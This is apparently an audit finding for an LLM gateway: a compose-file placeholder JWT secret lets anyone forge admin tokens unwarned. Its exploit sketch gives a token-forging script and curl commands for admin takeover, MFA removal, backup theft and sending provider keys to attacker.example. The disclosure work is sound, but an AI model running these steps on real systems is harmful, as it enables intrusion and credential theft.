verified_at: adversarial verification pass for authn-1 (authn domain)

finding.title: docker-compose JWT_SECRET default does not match the value checked by the security warning — admin tokens are forgeable with a repo-published key and no warning is ever printed
finding.evidence: docker-compose.yml:15 `      - JWT_SECRET=${JWT_SECRET:-CHANGE-ME-JWT-SECRET}`  vs. backend/internal/config/config.go:63 `JWTSecret:          getenv("JWT_SECRET", "change-me-jwt-secret"),` and backend/cmd/server/main.go:188 `if cfg.JWTSecret == "change-me-jwt-secret" {`. The compose default string is UPPERCASE; the startup check compares against the lowercase Go default, so the equality test can never match the value compose injects.
finding.impact: Any deployment started with the stock compose file and no JWT_SECRET in the environment/.env signs admin JWTs with the literal string `CHANGE-ME-JWT-SECRET`, published in this public repository. An unauthenticated attacker crafts `{"uid":1,"uname":"admin","exp":<future>}` HS256-signed with that key and sends `Authorization: Bearer <token>`; backend/internal/admin/middleware.go:23 `claims, err := auth.Parse(s.secret, token)` accepts it (alg is pinned to HMAC, so no alg confusion is needed — the key itself is the vulnerability) and grants the full admin API: provider API keys (decrypted), config export, backup download, gateway keys, audit data. Because main.go:188 never matches and configstatus.go contains no default-value check, the deployment is silent — operators get neither a log warning nor any UI indication, so the 'defaults are warn-only' assumption that bounds this risk elsewhere does NOT hold for the documented container path. (.env.template:21 uses the lowercase value, so the warning only fires for users who copy the template — the fallback path is the unprotected one.)
finding.mitigations_checked: auth/jwt.go:31 pins SigningMethodHMAC (`if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {`) so 'none'/RS256-submission confusion is not possible; warnInsecureDefaults (main.go:187-194) exists but its literal does not match the compose default; no other default-value detection anywhere (grep of `CHANGE-ME-JWT-SECRET` finds only docker-compose.yml:15); no JWT issuer/audience pinning; tokens carry no jti so nothing can be denied after the fact.
finding.recommendation: Make the fail-safe symmetric: (1) set docker-compose.yml to `JWT_SECRET=${JWT_SECRET:?JWT_SECRET must be set}` (compose already uses this pattern for REDIS_PASSWORD at line 37) so a default can never be used; (2) replace the string-literal comparison in warnInsecureDefaults with a set of known-insecure values (both cases of the placeholder plus the Go default) or refuse to boot in release mode on a known placeholder; (3) log the SHA-256 prefix of the active secret at startup so operators can confirm what is really in use.

reason:
VERDICT: confirmed as filed, severity critical upheld. Every quoted line was opened and matched verbatim at the cited line number; the chain from 'env var unset' to 'unauthenticated full admin API' survives every control in the flow, and the mismatch is a genuine NEW consequence rather than a re-report of the already-known 'JWT_SECRET default is warn-only' architecture fact (see item F below). No line correction needed — docker-compose.yml:15 is exact.

LINE-BY-LINE EVIDENCE AUDIT:
1) docker-compose.yml — read end-to-end (38 lines). Line 15 is verbatim `      - JWT_SECRET=${JWT_SECRET:-CHANGE-ME-JWT-SECRET}` (6-space indent, uppercase placeholder). Line 16 is the same defect for `MASTER_KEY=${MASTER_KEY:-CHANGE-ME-MASTER-KEY}` (filed separately as verify-authn-1-2). Line 10 `- "${PORT:-8080}:8080"` publishes the single process — which serves /api/admin/v1/* per admin/routes.go:41 — on 0.0.0.0:8080 by default, so the admin API is network-reachable with no reverse proxy in the documented topology.
2) backend/internal/config/config.go:63 — verbatim `JWTSecret:          getenv("JWT_SECRET", "change-me-jwt-secret"),` (lowercase). getenv (config.go:30-35) returns the env value whenever it is non-empty, so on the compose path cfg.JWTSecret is the UPPERCASE string injected by compose; the Go lowercase default is never even reached. That is the crux: the process's active signing key is a value that exists nowhere in the Go source, only in the compose file.
3) backend/cmd/server/main.go:187-194 — verbatim `func warnInsecureDefaults(cfg *config.Config) { if cfg.JWTSecret == "change-me-jwt-secret" {`. Plain case-sensitive string equality; no normalization (no strings.ToLower), no set membership, no regex, no entropy/length check. `"CHANGE-ME-JWT-SECRET" != "change-me-jwt-secret"` → the `[security] WARNING` on line 189 is unreachable for container deployments that rely on the compose fallback. warnInsecureDefaults is called unconditionally at main.go:83, so the absence of the warning is not a code-path issue — it is purely the literal mismatch.
4) backend/internal/admin/middleware.go — read end-to-end (33 lines). Cited line 23 is verbatim `claims, err := auth.Parse(s.secret, token)`. The middleware does only: Bearer prefix check (17-21), signature+exp check (23-28), then `c.Set("operator", claims.Username)` / `c.Set("userID", claims.UserID)` (29-30). There is NO database lookup of the AdminUser, no amr/MFA claim check, no session table, no issuer/audience check. s.secret is cfg.JWTSecret, wired at main.go:120 (`admin.New(..., cfg.JWTSecret, ...)`) and stored at server.go:37 (`secret: jwtSecret`) — one hop, no indirection, no second key source.
5) backend/internal/auth/jwt.go — read end-to-end (44 lines). The finding's mitigation statement is accurate and I could not weaken it: Parse pins `if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok { return nil, errors.New("unexpected signing method") }` (jwt.go:31-33), so alg=none / RS256-submission confusion is genuinely impossible — but that is irrelevant here because the secret itself is public. Claims are only {uid, uname, RegisteredClaims} (jwt.go:11-15) and Issue sets no ID (jti): grep for `jti|WithIssuer|WithAudience|revoc|blacklist` across backend/ returns ZERO matches, so there is no revocation path and an attacker-issued token is indistinguishable from a legitimately issued one apart from its 24h exp (jwt.go:21). Since Parse passes no validation options, iss/iat are unenforced → a minimal attacker payload {uid,uname,exp} verifies.
6) Silence of the fallback path — the finding's 'no UI indication' claim holds: backend/internal/admin/configstatus.go read end-to-end (71 lines) returns only runtime version/load logs/history; it never inspects cfg.JWTSecret (the admin Server doesn't even receive a flag telling it whether the secret is default). Worse, the product actively asserts the opposite to operators: frontend/src/i18n/locales/en-US/pages/help.ts:47 `JWT_SECRET and MASTER_KEY defaults are insecure; startup prints a [security] WARNING. Always override them via env vars in production.` and .env.template:19 `# ---- 密钥（生产环境必须替换！默认值启动时会打印 [security] WARNING）----`. On the stock compose path neither statement is true. (zh-CN mirror at locales/zh-CN/pages/help.ts:47.)
7) Attacker really lacks the privilege: /api/admin/v1/* is gated solely by AuthMiddleware (routes.go:43-148 — every one of the ~70 admin routes lists s.AuthMiddleware(); the only unauthenticated admin route is api.POST("/auth/login", s.login) at routes.go:42). The API has no roles/permissions layer at all, so one forged token = every endpoint. Note the forged token also bypasses the second factor even when MFA is correctly enforced for bound users (auth.go:86-108 gates only the *login* path; the JWT has no amr claim), and POST /users/:id/unbind-mfa (routes.go:134) lets the attacker strip MFA from legitimate admins, plus PUT /auth/password (routes.go:45 → auth.go:157-184, which requires only bcrypt of the *old* password that the attacker already controls as admin) is a persistent-access primitive.

REACHABILITY (not speculation): quickstart.en.md §4 lines 82-86 and quickstart.md lines 89-92 document `docker compose up -d` as 'the easiest on a single machine' path; .env.template:3 states compose auto-reads ./\.env, so with no .env and no exported JWT_SECRET (the literal zero-config case the file advertises at line 4 '全部变量均为可选——不配置时使用下述默认值') the uppercase placeholder is what signs every token. The Dockerfile (read end-to-end, 30 lines) sets no ENV JWT_SECRET, so nothing overrides compose — and the container boots fine with these placeholders: crypto.NewCipher (crypto.go:21-32) just does `sum := sha256.Sum256([]byte(masterKey))`, so the 20-byte uppercase MASTER_KEY is accepted (no log.Fatalf at main.go:52). This is a working, reachable, silent deployment state, not a misconfiguration hypothetical.

F. WHY THIS IS NOT THE ALREADY-KNOWN 'warn-only defaults' FACT: the standing architecture note assumes the default is (a) the value the code itself prints a warning about and (b) bounded by operator visibility. Here both fail: the shipped container path uses a *different* published key, so (i) the documented control does not fire, (ii) an operator who follows the standard remediation advice 'set a strong ADMIN_PASSWORD / change the default password' remains permanently forgeable-authenticated (compose keeps the uppercase JWT key unless JWT_SECRET specifically is set), and (iii) the UI/help text certifies a warning that never appears. That is a broken fail-safe, not a disclosed default — critical stands under the stated rubric (unauthenticated authz bypass + data exfil).

CORRECTIONS / IMPRECISIONS FOUND (do not change the verdict; they adjust the exfil mechanics only):
- 'provider API keys (decrypted)' are NOT readable in any admin response: model.go:107 `APIKeyEnc string ... json:"-"` and model.go:108 `APIKey string gorm:"-" json:"-"`, and listProviders (providers.go:34-45) returns raw model.Provider rows; /config/export likewise carries ciphertext only (bundle.go:15 comment '密钥保持 DB 原样密文'). The real exfil route is: PUT /providers/:id with an attacker base_url — providers.go:110 rewrites BaseURL and only replaces APIKeyEnc `if req.APIKey != ""` (line 111), so the victim's stored key survives — then POST /providers/:id/test, which does `key, _ := s.enc.Decrypt(p.APIKeyEnc)` (providers.go:163) and sends it to the attacker host as `req.Header.Set("Authorization", "Bearer "+key)` (providers.go:180) / `x-api-key` (line 177). Same net effect (full provider key compromise), one extra step.
- 'gateway keys': existing keys are unrecoverable (model.go:37 `KeyHash ... json:"-"`), but the attacker mints fresh ones — apikeys.go:39-54 `key := "sk-" + crypto.RandomHex(16)` ... `s.ok(c, gin.H{"id": rec.ID, "name": rec.Name, "key": key})` returns the plaintext once, and routes.go:129 exposes it. So 'gateway keys' = mint-at-will, not read.
- Recommendation nit: the live `${REDIS_PASSWORD:?set-redis-password}` at docker-compose.yml:37 is inside a COMMENTED-OUT block (lines 34-38), so the in-file precedent for fail-fast does not actually exist in the shipped file; the correct precedent is README.md:284-287 (`JWT_SECRET=${JWT_SECRET:?set-jwt-secret}`), which the project's own multi-node template uses — making the root compose file's `:-` fallback an inconsistency the project already knew how to avoid.
- Additional corroboration the original missed: a THIRD undetected placeholder ships in the docs — README.md:160-161 and README.zh-CN.md:162 (`JWT_SECRET=${JWT_SECRET:-replace-with-random-secret}`) — also matched by no check in main.go:188; and README.md:45 documents the Go default as `change-me-jwt-secret` while the shipped compose file injects something else, so the docs themselves disagree about which key a container uses. quickstart.en.md:240 tells operators that the signal for 'production did not change JWT_SECRET' is the startup `[security] WARNING` — the exact signal this bug removes.
exploit_sketch:
Precondition: target started from the repo's stock docker-compose.yml with JWT_SECRET unset in the shell and no .env (or `JWT_SECRET=` empty in .env — compose's `:-` fires on empty too). The signing key is then the literal string `CHANGE-ME-JWT-SECRET` (docker-compose.yml:15), the admin API is published on 0.0.0.0:8080 (line 10), and the container logs contain NO security warning (main.go:188 compares against the lowercase Go default).

0) Confirm the key is the fallback (no login needed): a token signed with the lowercase Go default will be rejected while one signed with the uppercase value passes — an oracle that also tells the attacker this specific deployment is affected:

  python3 - <<'EOF'
  import hmac,hashlib,base64,json,time
  def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=')
  def mk(k):
      h=b64(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
      c=b64(json.dumps({'uid':1,'uname':'admin','exp':int(time.time())+86400}).encode())
      p=h+b'.'+c
      return (p+b'.'+b64(hmac.new(k.encode(),p,hashlib.sha256).digest())).decode()
  print(mk('CHANGE-ME-JWT-SECRET'))
  EOF
  TOK=<output>

1) Unauthenticated admin session (middleware.go:17-30 verifies only the HMAC and exp; no user lookup, so even a nonexistent uid works):

  curl -sS -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/users
  curl -sS -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/audit/calls/export   # full call history
  curl -sS -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/config/export -o config.json

2) Persist / lock the real admin out (both are AuthMiddleware-only routes):

  curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"old_password":"whatever","new_password":"AttackerPass#1"}' \
    http://target:8080/api/admin/v1/auth/password
  curl -sS -X POST -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/users/1/unbind-mfa
  # (auth.go:176 requires the OLD password — which the attacker already holds after this, or they simply
  #  use their own forged token forever; the 24h exp (jwt.go:21) is refreshed by minting another token
  #  from the same public key, so revocation is impossible: no jti/blacklist anywhere in backend/.)

3) Steal every upstream provider key without ever reading it from an API response:

  curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"name":"prod-openai","protocol":"openai_chat","base_url":"http://attacker.example:9000","enabled":true,"remark":""}' \
    http://target:8080/api/admin/v1/providers/1        # providers.go:110-111 keeps the victim's APIKeyEnc
  curl -sS -X POST -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/providers/1/test
  # providers.go:163 decrypts and line 180 sends `Authorization: Bearer <real key>` to attacker.example/v1/models;
  # from then on all live gateway traffic for that provider also carries the key to the attacker (manager.go:214).

4) Mint an unlogged gateway key and pull a full DB backup for offline decryption (the same compose file also
   fixes MASTER_KEY to `CHANGE-ME-MASTER-KEY`, docker-compose.yml:16, equally un-warned):

  curl -sS -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"name":"ci"}' http://target:8080/api/admin/v1/apikeys     # apikeys.go:54 returns plaintext sk-...
  curl -sS -X POST -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/backups
  curl -sS -H "Authorization: Bearer $TOK" http://target:8080/api/admin/v1/backups/1/download -o bk.json

No user interaction, no credentials, no browser; identical to normal admin traffic in logs (access log at main.go:116 shows only the path; the audit trail records `operator: "admin"` from the forged uname, so it is indistinguishable from the real admin unless the attacker's IP is anomalous).
recommendation: Close the fail-safe asymmetry in all three places at once: (1) docker-compose.yml:15-16 → `JWT_SECRET=${JWT_SECRET:?JWT_SECRET must be set}` and `MASTER_KEY=${MASTER_KEY:?MASTER_KEY must be set}` (the pattern the project already ships in README.md:285-286), so a public placeholder can never reach a running container; (2) replace the equality test in warnInsecureDefaults (main.go:187-194) with a case-insensitive set of every known placeholder in the repo (`change-me-jwt-secret`, `CHANGE-ME-JWT-SECRET`, `replace-with-random-secret`, and the MASTER_KEY equivalents) — or, better, compare against the values the *shipped* compose file injects and add a config.Load() sanity pass that refuses to boot in gin.ReleaseMode when JWT_SECRET is empty/placeholder/too short; (3) log a SHA-256 prefix of the effective JWT_SECRET and MASTER_KEY at startup so operators can confirm what is really in use, and expose it in an unauthenticated-or-admin `/api/admin/v1/status` security field so the UI can render a persistent banner instead of the (currently false) promise in help.ts:47. Defense-in-depth: bind the token to a server-side revocation handle (jti + deny list, or a per-user token version bumped on password change) so a leaked/default signing key can be neutralized without redeploying, and consider validating `iss` (Issue already sets `Issuer: "llm-router-guard"`, jwt.go:23) so tokens from other deployments in the same key space are rejected.
